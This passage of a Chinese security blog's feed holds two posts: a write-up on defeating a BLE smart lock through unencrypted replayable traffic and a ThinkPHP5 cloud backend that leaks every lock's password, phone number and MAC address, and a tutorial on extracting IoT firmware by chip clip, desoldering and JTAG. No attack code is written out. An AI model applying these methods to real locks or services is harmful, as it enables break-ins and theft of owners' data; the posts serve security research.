    <published>2017-11-26T16:00:00.000Z</published>
    <updated>2018-06-29T09:01:11.356Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>随着物联网各类技术的逐步进步，越来越多的智能设备出现在我们生活中，智能锁在锁具市场上所占的份额将会越来越大，甚至超过传统锁，成为主流。而在智能锁中，因为低功耗蓝牙技术的推广，以及受外部环境限制小，通过手机APP交互方便等特点，很多智能锁采用的就是以BLE蓝牙芯片作为控制单元，控制电机或锁簧转动的模式，实现开关锁功能。与其他的安全问题相比，锁具的被破解，可能造成的危害更大，本文通过以破解某型号蓝牙锁，来展示目前蓝牙智能锁可能面临的安全风险。</p>
<h2 id="蓝牙锁介绍"><a href="#蓝牙锁介绍" class="headerlink" title="蓝牙锁介绍"></a>蓝牙锁介绍</h2><p> 蓝牙锁由于不受外部环境限制，功耗较低，和手机交互方便，目前用的比较多,形状也五花八门，例如目前使用最广泛的一些智能蓝牙锁。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage9.jpg" alt="img"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage10.jpg" alt="img"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage11.jpg" alt="img"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage12.jpg" alt="img"></p>
<h2 id="如何去破解一个蓝牙锁"><a href="#如何去破解一个蓝牙锁" class="headerlink" title="如何去破解一个蓝牙锁"></a>如何去破解一个蓝牙锁</h2><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage13.jpg" alt="img"></p>
<h3 id="目标介绍"><a href="#目标介绍" class="headerlink" title="目标介绍"></a>目标介绍</h3><p>这个属于低功耗蓝牙锁，使用app 绑定之后可以开启，还能共享密码，修改密码。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage14.jpg" alt="img"></p>
<h3 id="内部构架"><a href="#内部构架" class="headerlink" title="内部构架"></a>内部构架</h3><p>显微镜查看电路板<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/IMG_2214.jpg" alt="img"></p>
<p>拆解<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/IMG_2216.jpg" alt="img"></p>
<p>蓝牙锁内部搭载了一块CC2541蓝牙芯片，通过控制电机驱动芯片，带动卡榫运转，从而形成拉锁的开关。CC2541是TI推出的一款专门适用于BLE和专用的2.4GHz应用的SOC芯片解决方案,CC254X在目前物联网蓝牙通信解决方案中，市场占有率很高，应用场景非常广泛。</p>
<h3 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h3><p>使用app初步连接探测，可以看到</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage16.jpg" alt="img"></p>
<h3 id="开锁流程"><a href="#开锁流程" class="headerlink" title="开锁流程"></a>开锁流程</h3><p>Logcat 查看app日志</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage17.jpg" alt="img"></p>
<p>流程为</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/QQ截图20171123170725.jpg" alt="img"></p>
<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>一般对于蓝牙锁的攻击方式有三种</p>
<p>1、重放攻击<br>2、暴力破解(6位数字)<br>3、云端漏洞</p>
<h3 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h3><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage18.jpg" alt="img"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage19.jpg" alt="img"></p>
<p>通过蓝牙抓包分析，发现通信过程没有加密，可以重放获取认证密码，但如果要模拟真实的智能锁攻击场景，显然不能通过如此显眼的方式，真实环境中往往很难有一个给我们抓包或劫持的场景，所以最好的方式是远程无接触开锁，需要去找云端的漏洞。</p>
<h3 id="云端漏洞"><a href="#云端漏洞" class="headerlink" title="云端漏洞"></a>云端漏洞</h3><p>云端是Thinkphp5 写的，稍微看了一下,存在有两个漏洞。无认证可以遍历所有id拿到所有锁的信息</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage20.jpg" alt="img"></p>
<p>没有关闭调试模式会泄露信息,传入一个空的id会吧所有锁的信息报错显示出来，泄露所有锁的密码以及绑定的电话号码mac地址等信息。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage21.jpg" alt="img"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>对于真实的破解锁场景，最好用一个手机app来开锁掩人耳目，综合以上分析，编写一个开锁Android app 。<br>工作流程为</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/QQ截图20171123170725.jpg" alt="img"></p>
<p>利用 com.inuker.bluetooth 库快速开发</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage22.jpg" alt="img"></p>
<p>APP界面</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15117578788731.jpg" alt="img"></p>
<p>视频演示</p>
<p> <a href="https://v.qq.com/x/page/b051058vicv.html" rel="external nofollow noopener noreferrer" target="_blank">https://v.qq.com/x/page/b051058vicv.html</a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>ti官方页面  <a href="http://www.ti.com.cn/product/cn/CC2541" rel="external nofollow noopener noreferrer" target="_blank">http://www.ti.com.cn/product/cn/CC2541</a><br>cc2541蓝牙芯片手册  <a href="https://wenku.baidu.com/view/c7f99ac7376baf1ffd4fad31.html" rel="external nofollow noopener noreferrer" target="_blank">https://wenku.baidu.com/view/c7f99ac7376baf1ffd4fad31.html</a> </p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;随着物联网各类技术的逐步进步，越来越多的智能设备出现在我们生活中，智能锁在锁具市场上所占的份额将会越来越大，甚至超过传统锁，成为主流。而在智
    
    </summary>
    
      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="智能锁" scheme="http://www.future-sec.com/tags/%E6%99%BA%E8%83%BD%E9%94%81/"/>
    
      <category term="蓝牙攻击" scheme="http://www.future-sec.com/tags/%E8%93%9D%E7%89%99%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>物联网硬件安全分析基础-固件提取</title>
    <link href="http://www.future-sec.com/iot-security-hardware-obtain.html"/>
    <id>http://www.future-sec.com/iot-security-hardware-obtain.html</id>
    <published>2017-11-26T16:00:00.000Z</published>
    <updated>2018-06-29T10:47:15.653Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上节初步介绍一些硬件基础知识和分析硬件所需要的基本工具，本篇将讲述利用编程器直接读取芯片固件的方法。<br>为了读取Flash芯片的内容，有以下两种常用方式：</p>
<p>1、直接将导线连接到芯片的引脚，在通过飞线连接编程器，进行在线读取固件；</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image34.jpg" alt=""></p>
<p>2、把芯片拆焊下来，通过烧录座编程器，离线读取固件。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/dce974d6b8fae7f6/20180606_154759.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/5b2d35d6e7f9a.jpg" alt=""></p>
<h2 id="飞线法读取"><a href="#飞线法读取" class="headerlink" title="飞线法读取"></a>飞线法读取</h2><p>通过夹具夹住芯片引脚，然后连接编程器读取芯片内容，通过编程器连接芯片需要注意引脚的顺序，在IC芯片上都会有一个小点，大多数情况下，小点对应的引脚即为芯片的第一脚，而连接编程器的导线也需要插入编程器上相应的引脚。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image36.jpg" alt=""></p>
<h3 id="案例一：读取中控F7门禁固件"><a href="#案例一：读取中控F7门禁固件" class="headerlink" title="案例一：读取中控F7门禁固件"></a>案例一：读取中控F7门禁固件</h3><p>拆掉门禁外壳，通过电路图和芯片印字分析，在主板上有一颗FM25F04A存储芯片，通过夹具连接芯片到编程器，在通过专用编程器软件，对该芯片进行读取。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image37.jpg" alt=""></p>
<p>连接完成，确定引脚接线正确后，打开编程器对应软件，通过智能识别芯片ID，即可开始读取固件工作。<br>如无法识别，可根据印字说明，尝试类似的型号，一般情况下兼容。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image38.jpg" alt=""></p>
<p>点击读取，即可开始固件提取，成功之后会保存为BIN格式文件，打开即可看到16进制的内容，为下一步分析提供基础。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image39.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image40.jpg" alt=""></p>
<h3 id="案例二：读取某智能摄像头固件"><a href="#案例二：读取某智能摄像头固件" class="headerlink" title="案例二：读取某智能摄像头固件"></a>案例二：读取某智能摄像头固件</h3><p>拆掉摄像头外壳，通过分析PCB上的各个IC，找到Flash存储芯片。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image41.jpg" alt=""></p>
<p>在显微镜下，可以看到是一颗25L64型号的Flash芯片。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image118.jpg" alt=""></p>
<p>用夹具连接各引脚，并和编程器连接，进行固件读取。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image42.jpg" alt=""></p>
<p>识别到芯片型号为GD25Q64，点击读取，读取完毕后按照提示保存到文件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image43.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image44.jpg" alt=""></p>
<p>打开保存的BIN文件或者查看缓冲区，即可看到固件内容。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image45.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image46.jpg" alt=""></p>
<p>在Ubuntu中，用binwalk解包固件，做进一步分析。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image116.jpg" alt=""></p>
<h3 id="案例三：读取某智能摄像头固件"><a href="#案例三：读取某智能摄像头固件" class="headerlink" title="案例三：读取某智能摄像头固件"></a>案例三：读取某智能摄像头固件</h3><p>打开外壳，在PCB背面发现一颗FLASH存储芯片<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image47.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image48.jpg" alt=""></p>
<p>通过显微镜发现芯片型号为25L128。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image120.jpg" alt=""></p>
<p>连接编程器读取固件并保存。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image49.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image50.jpg" alt=""></p>
<h3 id="案例四：读取某路由器固件"><a href="#案例四：读取某路由器固件" class="headerlink" title="案例四：读取某路由器固件"></a>案例四：读取某路由器固件</h3><p>打开外壳，发现PCB上有一颗Flash存储器，但厂商出于安全考虑，把芯片印字涂抹掉了。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image52.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image119.jpg" alt=""></p>
<p>在不知道芯片型号的情况下，我们连接该芯片，让编程器去尝试读取。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image51.jpg" alt=""></p>
<p>通过智能识别，发现编程器无法识别出具体型号，而因为Flash存储芯片的种类多样，通过查找又无法获得该路由器的具体参数，这时我们通过UART串口，读取出UBOOT启动信息，串口输出里面发现了该芯片型号为W25Q128BV。（下一篇将会重点介绍关于串口调试的方法）<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image54.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image53.jpg" alt=""></p>
<p>在编程器中选择该型号，成功提取出固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image55.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image56.jpg" alt=""></p>
<p>用binwalk解包固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image115.jpg" alt=""></p>
<h3 id="案例五：读取某智能电饭锅固件"><a href="#案例五：读取某智能电饭锅固件" class="headerlink" title="案例五：读取某智能电饭锅固件"></a>案例五：读取某智能电饭锅固件</h3><p>拆掉外壳，背面嵌有一块PCB，反面是WIFI处理芯片，正面为存储器，连接编程器。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image57.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image58.jpg" alt=""></p>
<p>通过印字分析为25芯片，存储大小为2M字节，尝试该型号芯片，成功读取固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image59.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image60.jpg" alt=""></p>
<h3 id="案例六：读取某网络监控摄像机固件"><a href="#案例六：读取某网络监控摄像机固件" class="headerlink" title="案例六：读取某网络监控摄像机固件"></a>案例六：读取某网络监控摄像机固件</h3><p>在PCB上找到一块25L128型号的Flash存储芯片。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image62.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image121.jpg" alt=""></p>
<p>通过夹具连接编程器。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image61.jpg" alt=""></p>
<p>识别到芯片为MX25L128，选择其中一种，成功提取固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image63.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image64.jpg" alt=""></p>
<p>用binwalk解包固件内容。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image117.jpg" alt=""></p>
<h2 id="拆焊芯片读取固件"><a href="#拆焊芯片读取固件" class="headerlink" title="拆焊芯片读取固件"></a>拆焊芯片读取固件</h2><p>一般情况下，对于TSOP8封装的闪存芯片，可以用上述方法来读取，但可能存在在线读取成功率不高或数据丢失的情况，对于更多引脚和封装格式的芯片，飞线的难度更高，有一定锡焊基础的建议采用拆焊芯片，用烧录座离线读取的方法。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628165648.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628165631.jpg" alt=""></p>
<p>热风枪设置在适合的温度，吹下芯片，周围的元件可以用铝箔或锡箔纸适当保护。</p>
<p>拆下的闪存芯片放在烧录座上，在连接编程器进行读写，芯片放置的引脚方向要注意对齐编程器和烧录座的第一脚。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628165637.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628165659.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628165651.jpg" alt=""></p>
<p>读取完成，用点焊法把芯片焊上焊盘即可。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628165634.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628171222.jpg" alt=""></p>
<p>更多芯片焊接修改操作请参考2.4.2 硬件修改一节</p>
<h2 id="jtag提取固件"><a href="#jtag提取固件" class="headerlink" title="jtag提取固件"></a>jtag提取固件</h2><h3 id="拆焊芯片"><a href="#拆焊芯片" class="headerlink" title="拆焊芯片"></a>拆焊芯片</h3><p>首先用热风枪拆下智能锁主控芯片，该单片机型号为：Stm32F103R6。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3522b3bcebf.jpg" alt=""></p>
<h3 id="烧录座连接Jlink"><a href="#烧录座连接Jlink" class="headerlink" title="烧录座连接Jlink"></a>烧录座连接Jlink</h3><p>芯片第一脚对齐烧录座第一脚，然后把Jlink插入烧录座引出的JTAG接口。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b352394427b3.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3523a551154.jpg" alt=""></p>
<h3 id="读取固件"><a href="#读取固件" class="headerlink" title="读取固件"></a>读取固件</h3><p>电脑上安装好Jlink驱动，打开J-Flash客户端，设置好参数，主要在配置栏选择正确的芯片型号，然后点击连接，在点击Target-&gt;Read Back-&gt;Entire trip即可读写固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3524c6c08bb.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3524ced11a4.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3524d65ced7.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3524db79b3c.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3524f327ac3.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上节初步介绍一些硬件基础知识和分析硬件所需要的基本工具，本篇将讲述利用编程器直接读取芯片固件的方法。&lt;br&gt;为了读取Flash芯片的内容，有
    
    </summary>
    
      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="硬件分析" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
